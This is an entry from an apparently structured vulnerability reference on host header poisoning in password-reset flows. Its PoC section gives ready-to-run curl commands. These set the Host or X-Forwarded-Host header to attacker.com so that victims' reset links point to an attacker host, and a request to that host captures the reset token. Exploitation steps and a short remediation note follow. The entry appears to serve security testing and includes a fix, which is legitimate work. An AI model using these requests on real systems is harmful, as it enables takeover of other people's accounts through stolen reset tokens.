---
id: "host-header-poisoning"
title: "Host header poisoning (hijacked password-reset links → arbitrary account takeover)"
kind: "implementation"
cve: null
related-cves: null
cve-note: "None (implementation flaw)"
severity: "critical"
cvss: 9.1
severity-basis: "cvss"
severity-note: null
product: "Custom password-recovery/invitation links (URLs built from Host)"
versions: "Any"
ports: "80, 443"
keywords: "host, header, poisoning, password reset, links, hijacking"
entry: "Host / X-Forwarded-Host in POST /api/user/findpwd"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (implementation flaws)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

- URLs in password-recovery/invitation/payment-callback emails match the request Host;
- A reverse proxy is present and the application reads `X-Forwarded-Host`.

## Prerequisites

- The server builds email/SMS links from Host; an attacker can trigger sending.

## PoC

```bash
# 1) Change Host to trigger a reset and inspect the link domain in the email
curl -s -X POST 'https://target/api/user/findpwd' \
  -H 'Host: attacker.com' -H 'Content-Type: application/json' \
  -d '{"email":"victim@corp.com"}'

# 2) Use XFH in reverse-proxy scenarios
curl -s -X POST 'https://target/api/user/findpwd' \
  -H 'X-Forwarded-Host: attacker.com' -d '{"email":"victim@corp.com"}'
# Result: email contains https://attacker.com/reset?token=... = confirmed

# 3) Duplicate Host / absolute URI variants
curl -s 'https://target/api/user/findpwd' -H 'Host: attacker.com:443'
```

```bash
# 4) Change the password with the hijacked token (requires the victim to click, or verify the chain with your own account)
curl -s 'https://attacker.com/reset?token=<token>'   # The landing page records the token
```

## Exploitation Steps

1. Verify the chain with your own account first (receive your own email);
2. Send again with a changed Host/XFH and compare email domains;
3. Success means "arbitrary users' reset links can be hijacked";
4. Evidence: two requests + comparison of the links in two emails (mask tokens).

## Remediation and Mitigation

- Use a configured allowlisted site URL, not the request Host; validate allowed Host values; bind reset tokens to users.

## References

- OWASP Host Header attacks; CWE-644.
